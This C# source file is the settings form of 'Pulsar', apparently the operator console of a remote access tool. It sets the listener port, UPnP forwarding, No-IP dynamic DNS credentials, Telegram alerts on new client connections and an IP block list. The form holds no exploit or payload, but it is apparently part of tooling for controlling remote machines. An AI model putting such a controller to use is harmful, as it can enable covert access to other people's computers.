using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using System;
using System.Globalization;
using System.Linq;
using System.Net.Sockets;
using System.Windows.Forms;
using Pulsar.Server.DiscordRPC;
using Pulsar.Server.TelegramSender;
using System.Text.Json;
using System.IO;
using System.Collections.Generic;


namespace Pulsar.Server.Forms
{
    public partial class FrmSettings : Form
    {
        private readonly PulsarServer _listenServer;
        private bool _previousDiscordRPCState; // Track previous state of Discord RPC checkbox

        public FrmSettings(PulsarServer listenServer)
        {
            this._listenServer = listenServer;

            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);

            ToggleListenerSettings(!listenServer.Listening);

            ShowPassword(false);
        }

        private void FrmSettings_Load(object sender, EventArgs e)
        {
            ncPort.Value = Settings.ListenPort;
            chkDarkMode.Checked = Settings.DarkMode;
            chkIPv6Support.Checked = Settings.IPv6Support;
            chkAutoListen.Checked = Settings.AutoListen;
            chkPopup.Checked = Settings.ShowPopup;
            chkUseUpnp.Checked = Settings.UseUPnP;
            chkShowTooltip.Checked = Settings.ShowToolTip;
            chkNoIPIntegration.Checked = Settings.EnableNoIPUpdater;
            chkEventLog.Checked = Settings.EventLog;
            txtTelegramChatID.Text = Settings.TelegramChatID;
            txtTelegramToken.Text = Settings.TelegramBotToken;
            chkTelegramNotis.Checked = Settings.TelegramNotifications;
            txtNoIPHost.Text = Settings.NoIPHost;
            txtNoIPUser.Text = Settings.NoIPUsername;
            txtNoIPPass.Text = Settings.NoIPPassword;
            chkDiscordRPC.Checked = Settings.DiscordRPC; // Will load as false by default
            _previousDiscordRPCState = chkDiscordRPC.Checked;

            string filePath = "blocked.json";
            try
            {
                string json = File.ReadAllText(filePath);
                var blockedIPs = JsonSerializer.Deserialize<List<string>>(json);
                if (blockedIPs != null && blockedIPs.Count > 0)
                {
                    BlockedRichTB.Text = string.Join(Environment.NewLine, blockedIPs);
                }
                else
                {
                    BlockedRichTB.Text = string.Empty;
                }
            }
            catch (Exception ex)
            {

            }
        }

        private ushort GetPortSafe()
        {
            var portValue = ncPort.Value.ToString(CultureInfo.InvariantCulture);
            ushort port;
            return (!ushort.TryParse(portValue, out port)) ? (ushort)0 : port;
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            ushort port = GetPortSafe();

            if (port == 0)
            {
                MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            if (btnListen.Text == "Start listening" && !_listenServer.Listening)
            {
                try
                {
                    if (chkNoIPIntegration.Checked)
                        NoIpUpdater.Start();
                    _listenServer.Listen(port, chkIPv6Support.Checked, chkUseUpnp.Checked);
                    ToggleListenerSettings(false);
                }
                catch (SocketException ex)
                {
                    if (ex.ErrorCode == 10048)
                    {
                        MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    else
                    {
                        MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    _listenServer.Disconnect();
                }
                catch (Exception)
                {
                    _listenServer.Disconnect();
                }
            }
            else if (btnListen.Text == "Stop listening" && _listenServer.Listening)
            {
                _listenServer.Disconnect();
                ToggleListenerSettings(true);
                FrmMain mainForm = Application.OpenForms.OfType<FrmMain>().FirstOrDefault();
                if (mainForm != null)
                {
                    mainForm.EventLog("Server stopped listening for connections.", "info");
                }
            }
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            ushort port = GetPortSafe();

            if (port == 0)
            {
                MessageBox.Show("Please enter a valid port > 0.", "Please enter a valid port", MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                return;
            }

            Settings.ListenPort = port;
            Settings.DarkMode = chkDarkMode.Checked;
            Settings.IPv6Support = chkIPv6Support.Checked;
            Settings.AutoListen = chkAutoListen.Checked;
            Settings.ShowPopup = chkPopup.Checked;
            Settings.UseUPnP = chkUseUpnp.Checked;
            Settings.ShowToolTip = chkShowTooltip.Checked;
            Settings.EnableNoIPUpdater = chkNoIPIntegration.Checked;
            Settings.EventLog = chkEventLog.Checked;
            Settings.NoIPHost = txtNoIPHost.Text;
            Settings.NoIPUsername = txtNoIPUser.Text;
            Settings.NoIPPassword = txtNoIPPass.Text;
            Settings.DiscordRPC = chkDiscordRPC.Checked;
            Settings.TelegramChatID = txtTelegramChatID.Text;
            Settings.TelegramBotToken = txtTelegramToken.Text;
            Settings.TelegramNotifications = chkTelegramNotis.Checked;
            DiscordRPCManager.ApplyDiscordRPC(this);

            FrmMain mainForm = Application.OpenForms.OfType<FrmMain>().FirstOrDefault();
            if (mainForm != null)
            {
                mainForm.EventLogVisability();
            }

            string[] ipList = BlockedRichTB.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            var blockedIPs = ipList.ToList();
            string filePath = "blocked.json";
            try
            {
                string json = JsonSerializer.Serialize(blockedIPs, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(filePath, json);
            }
            catch (Exception ex)
            {

            }

            this.Close();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Discard your changes?", "Cancel", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
                DialogResult.Yes)
                this.Close();
        }

        private void chkNoIPIntegration_CheckedChanged(object sender, EventArgs e)
        {
            NoIPControlHandler(chkNoIPIntegration.Checked);
        }

        private void chkDiscordRPC_CheckedChanged(object sender, EventArgs e)
        {
            Settings.DiscordRPC = chkDiscordRPC.Checked;
            DiscordRPCManager.ApplyDiscordRPC(this);
            Console.WriteLine("Discord RPC toggled to: " + chkDiscordRPC.Checked);

            // Show popup only when user actively disables Discord RPC (from true to false)
            if (_previousDiscordRPCState && !chkDiscordRPC.Checked)
            {
                MessageBox.Show(
                    "Discord RPC has been disabled. It may still show on your profile until you restart both Discord and Pulsar.",
                    "Discord RPC Disabled",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information
                );
            }

            // Update previous state for the next change
            _previousDiscordRPCState = chkDiscordRPC.Checked;
        }

        private void ToggleListenerSettings(bool enabled)
        {
            btnListen.Text = enabled ? "Start listening" : "Stop listening";
            ncPort.Enabled = enabled;
            chkIPv6Support.Enabled = enabled;
            chkUseUpnp.Enabled = enabled;
        }

        private void NoIPControlHandler(bool enable)
        {
            lblHost.Enabled = enable;
            lblUser.Enabled = enable;
            lblPass.Enabled = enable;
            txtNoIPHost.Enabled = enable;
            txtNoIPUser.Enabled = enable;
            txtNoIPPass.Enabled = enable;
            chkShowPassword.Enabled = enable;
        }
        private void TelegramControlHandler(bool enable)
        {
            txtTelegramToken.Enabled = enable;
            txtTelegramChatID.Enabled = enable;
        }

        private void ShowPassword(bool show = true)
        {
            txtNoIPPass.PasswordChar = (show) ? (char)0 : (char)'●';
        }

        private void chkShowPassword_CheckedChanged(object sender, EventArgs e)
        {
            ShowPassword(chkShowPassword.Checked);
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void chkTelegramNotis_CheckedChanged(object sender, EventArgs e)
        {
            TelegramControlHandler(chkTelegramNotis.Checked);
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(txtTelegramToken.Text))
                {
                    MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
                    return;
                }

                string[] tokenParts = txtTelegramToken.Text.Split(':');
                if (tokenParts.Length != 2 ||
                    !tokenParts[0].All(char.IsDigit) ||
                    tokenParts[1].Length != 35 ||
                    !tokenParts[1].All(c => char.IsLetterOrDigit(c) || c == '_' || c == '-'))
                {
                    MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
                    return;
                }

                if (string.IsNullOrWhiteSpace(txtTelegramChatID.Text))
                {
                    MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
                    return;
                }

                if (!long.TryParse(txtTelegramChatID.Text, out long chatId))
                {
                    MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
                    return;
                }

                string response = await Pulsar.Server.TelegramSender.Send.SendConnectionMessage(
                    txtTelegramToken.Text,
                    txtTelegramChatID.Text,
                    "TestClient123",
                    "192.168.1.100",
                    "TestLand"
                );
                MessageBox.Show("Checked And Working");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: Please Make Sure You Started A Chat With The Bot");
            }
        }
        private void txtNoIPHost_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
